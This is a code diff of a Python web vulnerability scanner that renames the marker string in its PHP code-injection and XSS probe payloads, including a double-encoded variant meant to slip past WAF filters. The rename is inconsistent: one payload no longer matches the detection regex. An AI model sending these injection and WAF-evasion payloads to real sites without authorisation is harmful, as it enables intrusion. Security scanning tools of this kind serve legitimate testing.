@@ -48,7 +48,7 @@ def rce_func(url):
   	print ga.blue+" [!] Covering Linux & Windows Operating Systems "+ga.end
   	print ga.blue+" [!] Please wait ...."+ga.end
   	# Remote Code Injection Payloads
-  	payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
+  	payloads = [';${@print(md5(dadevil))}', ';${@print(md5("dadevil"))}']
   	# Below is the Encrypted Payloads to bypass some Security Filters & WAF's
   	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
   	# Remote Command Execution Payloads
@@ -61,9 +61,9 @@ def xss_func(url):
         print ga.bold+"\n [!] Now Scanning for XSS "+ga.end
         print ga.blue+" [!] Please wait ...."+ga.end
         #Paylod zigoo="css();" added for XSS in <a href TAG's
-        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
-        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
-        check = re.compile('zigoo0<svg|x>x', re.I)
+        payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
+        payloads += ['%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
+        check = re.compile('dadevil<svg|x>x', re.I)
         main_function(url, payloads, check)
 
 def error_based_sqli_func(url):
